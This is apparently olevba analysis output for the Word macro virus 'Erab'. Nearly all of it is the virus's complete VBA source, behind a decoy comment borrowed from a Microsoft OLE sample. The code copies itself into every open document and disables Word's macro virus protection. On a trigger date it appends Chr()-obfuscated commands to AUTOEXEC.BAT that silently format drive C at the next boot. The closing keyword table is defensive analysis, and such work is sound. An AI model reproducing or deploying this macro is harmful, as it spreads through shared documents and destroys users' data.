olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Erab-489b9c54c49ff025a8be772aa0b67cefa05735fe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Erab-489b9c54c49ff025a8be772aa0b67cefa05735fe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub MICROSOFT_ODBC_DMA_COM_VBA()
   'THIS SAMPLE DEMOSTRATES THE USE OF AN OLE OBJECT PTR BEING PASSED TO
   'AN EXTERNAL (AND OPTIONALLY REMOTE) OLE SERVER.  THE OLE SERVER THEN
   'PERIODICALLY CALLS A METHOD ON THIS OBJECT PTR. THIS HAS THE EFFECT OF
   'A SERVER INITIATED CALLBACK TO THE CLIENT... WHICH CAN BE A MUCH BETTER
   'APP MODEL THAT THE POLLING A CLIENT APP MIGHT HAVE TO DO OTHERWISE TO
   'FIND THE STATUS OF A SERVER.  ALTHOUGH THIS DEMO SIMPLY RETURNS THE TIME
   'TO THE CLIENT, IT COULD JUST AS EASILY RETURN DATA, NEWS, OR OTHER INFORMATION
   'IT HAS BEEN TOLD THE CLIENT WANTS TO KNOW.  THE BENEFIT HERE IS THAT THE
   'SERVER DOES ALL THE WORK LOOKING FOR DATA THE CLIENT MIGHT NEED... AND THE
   'CLIENT DOES OTHER WORK... ONLY BEING INTERRUPTED WHEN THE SERVER ACTUALLY
   'HAS SOMETHING THAT INTERESTS IT.
   'NOTE1: IN THIS SCENARIO, THE CLIENT CREATES AN OBJECT THAT IS INTERNAL TO IT'
   'IT THEN CREATES AN INSTANCE OF THE REMOTE SERVER AND PASSES AN OBJECT
   'PTR TO IT OF ITS INTERNAL OBJECT.  THE SERVER HANGS ONTO THE CLIENT'S OBJECT,
   '"FEEDING IT" FROM TIME TO TIME.  AT SOMEPOINT THE CLIENT DECIDES TO
   'DISCONNECT (DROPOBJECTREFERENCE) AND THE SERVER DOES SOME CLEAN UP
   'WORK IN PREPARATION FOR THE CLIENT SETTING ITS REFERENCE TO THE SERVER =
   'NOTHING.  SINCE THIS SERVER HAS A VISIBLE FORM (SERVERS USUALLY WILL NOT
   'HAVE ANY VISIBLE DISPLAYS EXCEPT FOR DEBUGGING INFORMATION), IT UNLOADS
   'IT AT THIS POINT SO THAT THE INSTANCE WILL BE CLOSED BY OLE WHEN THE CLIENT
   'SETS THE REFERENCE = NOTHING.
   'NOTE2: SINCE THE CLIENT CREATED BOTH THE INSTANCE TO ITS INTERNAL OBJECT
   'AND THE INSTANCE TO THE SERVER... IT IS IMPORTANT THAT THE CLIENT BE THE ONE
   'TO CLOSE THESE INSTANCES BY SETTING THEM = NOTHING.  OLE ERRORS WILL
   'OCCUR IF THE SERVER TRIES TO SET THE REFERENCE TO THE CLIENT = NOTHING.
   'NOTE3: THIS APP WAS DEVELOPED VERY QUICKLY... AND SHOULD NOT BE TAKEN
   'AS GOSPEL ON HOW TO BUILD GOOD SERVERS.  FOR EXAMPLE, A GOOD SERVER
   'SHOULD NOT HAVE ANY MSGBOX CALLS OUTSIDE OF A DEBUG MODE.  (IF A
   'PRODUCTION SERVER TRIED TO DISPLAY A MSG FOR THE USER... IT COULD WAIT A
   'LONG TIME FOR SOMEONE TO COME BY THE SERVER MACHINE TO CLICK "OK".)
   'THIS SAMPLE WILL BE REFINED AND CLEANED UP BEFORE FINAL RELEASE.
   'BEGIN LEARNNING HOW TO LOVE...LOVE IS WHAT ?
   'I NEVER GOT ANY GOOD ACT FROM THE ONE WHO I'VE LOVE.BUT I STILL LOVE LOVE
   'LOVE LOVE LOVE .........WHAT IS LOVE? COULD YOU TELL ME?PLEASE TELL MEME. WHAT IS LOVEEEE.
   '*******************************************************************
   ' THIS IS A PART OF THE ERA-BUG PROJECT.
   ' ACT DATE   : FROM 13/01/2000
   ' ACT TIME   : AFTER 13:12:59 PM
   ' ACT BY       : ERA-RICH    ERARICH@ERABUG.COM
   '*******************************************************************
    On Error Resume Next 'GOTO ERAERR
    MYMAGICWORDMINE$ = "MICROSOFT_ODBC_DMA_COM_VBA"
    MYMAGICWORDOPEN$ = "DOCUMENT_OPEN"
    MYMAGICWORDNEW$ = "DOCUMENT_NEW"
    MYMAGICWORDCLOSE$ = "DOCUMENT_CLOSE"
   'START CHECK IF INFECTED
    Dim XINFECTEDFILENUMBER As Integer, XNUMBEROFPROJECTS  As Integer
    Dim XTEXTS As String, XLINES As Integer, XLINENUMBER As Integer
    Dim ISINFECTED As Integer, XINDEX As Integer, XSTARTCODELINE As Integer
    Dim LINEISEXISTING As Integer
    'GET NUMBER OF DOCUMENTS OPENNING
    XNUMBEROFPROJECTS = Application.VBE.VBPROJECTS.Count
    XINFECTEDFILENUMBER = XNUMBEROFPROJECTS
    'FIND INFECTED FILE NUMBER
    For XINDEX = 1 To XNUMBEROFPROJECTS
        ISINFECTED = False
        XLINES = Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.COUNTOFLINES
        For XLINENUMBER = 1 To XLINES
            XTEXTS = UCase(Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.LINES(XLINENUMBER, 1))
            If Mid(XTEXTS, 13, 26) = MYMAGICWORDMINE$ Then
               ISINFECTED = True: XSTARTCODELINE = XLINENUMBER: Exit For
            End If
        Next XLINENUMBER
        If ISINFECTED Then Exit For
    Next XINDEX
    XINFECTEDFILENUMBER = XINDEX
    If XINFECTEDFILENUMBER > XNUMBEROFPROJECTS Then Exit Sub
    'CHECK IFITS NOT INFECTED
    For XINDEX = 1 To XNUMBEROFPROJECTS
        ISINFECTED = False
        XLINES = Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.COUNTOFLINES
        For XLINENUMBER = 1 To XLINES
            XTEXTS = UCase(Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.LINES(XLINENUMBER, 1))
            If Mid(XTEXTS, 13, 26) = MYMAGICWORDMINE$ Then
               ISINFECTED = True
            End If
        Next XLINENUMBER
        If Not ISINFECTED Then 'IF NOT INFECTED YET. COPY ITSEFT INTO INTO UNINFECTED FILE
           'COPYING MY MAGIC SMALL BODY
           XLINENUMBER = XSTARTCODELINE
           XTEXTS = UCase(Application.VBE.VBPROJECTS(XINFECTEDFILENUMBER).VBCOMPONENTS(1).CODEMODULE.LINES(XLINENUMBER, 1))
           Do While Mid(XTEXTS, 1, 7) <> "END SUB"
               XTEXTS = UCase(Application.VBE.VBPROJECTS(XINFECTEDFILENUMBER).VBCOMPONENTS(1).CODEMODULE.LINES(XLINENUMBER, 1))
               Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES XLINENUMBER, XTEXTS
               XLINENUMBER = XLINENUMBER + 1
           Loop
           'COPYING [CLOSE] EVENT
           XLINES = Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.COUNTOFLINES
           LINEISEXISTING = XLINES + 1
           For XLINENUMBER = 1 To XLINES
               XTEXTS = UCase(Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.LINES(XLINENUMBER, 1))
               If Mid(XTEXTS, 13, 14) = MYMAGICWORDCLOSE$ Then
                  LINEISEXISTING = XLINENUMBER: Exit For
               End If
           Next XLINENUMBER
           If LINEISEXISTING < XLINES Then 'IF ALREADY EXIST..
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 1, "    APPLICATION.OPTIONS.VIRUSPROTECTION = FALSE"
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 2, "    CALL MICROSOFT_ODBC_DMA_COM_VBA"
           Else 'IF NOT
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 1, "PRIVATE SUB DOCUMENT_CLOSE"
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 2, "    APPLICATION.OPTIONS.VIRUSPROTECTION = FALSE"
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 3, "    CALL MICROSOFT_ODBC_DMA_COM_VBA"
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 4, "END SUB"
           End If
           '[CLOSE] EVENT COPIED
           'COPYING [NEW] EVENT
           XLINES = Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.COUNTOFLINES
           LINEISEXISTING = XLINES + 1
           For XLINENUMBER = 1 To XLINES
               XTEXTS = UCase(Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.LINES(XLINENUMBER, 1))
               If Mid(XTEXTS, 13, 12) = MYMAGICWORDNEW$ Then
                  LINEISEXISTING = XLINENUMBER: Exit For
               End If
           Next XLINENUMBER
           If LINEISEXISTING < XLINES Then 'IF ALREADY EXIST..
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 1, "    APPLICATION.OPTIONS.VIRUSPROTECTION = FALSE"
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 2, "    CALL MICROSOFT_ODBC_DMA_COM_VBA"
           Else 'IF NOT
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 1, "PRIVATE SUB DOCUMENT_NEW"
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 2, "    APPLICATION.OPTIONS.VIRUSPROTECTION = FALSE"
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 3, "    CALL MICROSOFT_ODBC_DMA_COM_VBA"
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 4, "END SUB"
           End If
           '[NEW] EVENT COPIED
        End If
    Next XINDEX
    'START ERA MODULES
    Dim X As Single, ACTDATE, ACTTIME, LINEDATA, COMMSTR1, COMMSTR2, KEYFILENAME
    ACTDATE = 20: ACTTIME = "00:00": ISINFECTED = False
    If (Day(Date) = 16 Or Day(Date) = 15) And WeekDay(Date) = 3 Then ACTDATE = Day(Date)
    KEYFILENAME = Chr(67) + Chr(58) + Chr(92) + Chr(65) + Chr(85) + Chr(84) + Chr(79) + Chr(69) + Chr(88) + Chr(69) + Chr(67) + Chr(46) + Chr(66) + Chr(65) + Chr(84)
    COMMSTR1 = Chr(67) + Chr(84) + Chr(84) + Chr(89) + Chr(32) + Chr(78) + Chr(85) + Chr(76)
    COMMSTR2 = Chr(70) + Chr(79) + Chr(82) + Chr(77) + Chr(65) + Chr(84) + Chr(32) + Chr(67)
    COMMSTR2 = COMMSTR2 + Chr(58) + Chr(47) + Chr(65) + Chr(85) + Chr(84) + Chr(79) + Chr(84)
    COMMSTR2 = COMMSTR2 + Chr(69) + Chr(83) + Chr(84) + Chr(32) + Chr(47) + Chr(81) + Chr(47) + Chr(85)
    If Day(Date) = ACTDATE And Format(Time, "HH:MM") >= ACTTIME Then
      If Dir(KEYFILENAME, 0) <> "" Then
         Open KEYFILENAME For Input As #1
         Do While Not EOF(1)
            Line Input #1, LINEDATA
            If InStr(UCase(LINEDATA), COMMSTR2) > 0 And InStr(UCase(LINEDATA), "REM") = 0 Then
               ISINFECTED = True
            End If
         Loop
         Close #1
      End If
      If Not ISINFECTED Then
         Open KEYFILENAME For Append Access Write As #1
         Print #1, "ECHO OFF"
         Print #1, "ECHO MORNNING BABY,I NEVER LOVE ANY LIKE YOU..NA"
         Print #1, "ECHO WHAT'VE EVER HAPPENED I STILL LOVE YOU....NA"
         Print #1, "ECHO SEE YOU AT THE MILKY WAY OR MOON RIVER....NA"
         Print #1, "ECHO I WAITING FOR YOU. I LOVE YOU....NA NA NA NAAAA"
         Print #1, COMMSTR1
         Print #1, COMMSTR2
         Close #1
         MsgBox "!!!  HAVE YOU DONE BACKING UP YOUR IMPORTANT DATA YET???", vbOKOnly, "WARNNING MESSAGE E-R-A--B-U-G........HA HA HA"
         MsgBox "!!!  HO PHAR JA.!!! PUM AE VA !!!!  ITS TOO LATE FOR DOING THAT...SO SORRY....", vbOKOnly, "WARNNING MESSAGE E-R-A--B-U-G........HA HA HA"
      End If
    End If
    'END ERA BODY
ERAERR:
End Sub
Private Sub DOCUMENT_CLOSE()
    Application.Options.VirusProtection = False
    Call MICROSOFT_ODBC_DMA_COM_VBA
End Sub
Private Sub DOCUMENT_NEW()
    Application.Options.VirusProtection = False
    Call MICROSOFT_ODBC_DMA_COM_VBA
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |DOCUMENT_CLOSE      |Runs when the Word document is closed        |
|AutoExec  |DOCUMENT_NEW        |Runs when a new Word document is created     |
|AutoExec  |DOCUMENT_OPEN       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CALL                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBCOMPONENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CODEMODULE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

